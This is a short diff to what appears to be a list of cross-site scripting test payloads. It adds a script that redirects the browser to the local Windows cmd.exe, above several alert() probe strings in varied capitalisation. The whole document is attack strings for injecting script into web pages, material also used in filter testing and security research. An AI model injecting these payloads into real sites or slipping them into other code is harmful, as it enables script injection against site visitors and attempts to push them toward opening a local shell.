@@ -1,3 +1,4 @@
+<script>window.location.assign('file:///C://Windows/System32/cmd.exe')</script>
 <script>alert(1)</script>
 <Script>alert(2)</Script>
 <script>alert(123);</script>
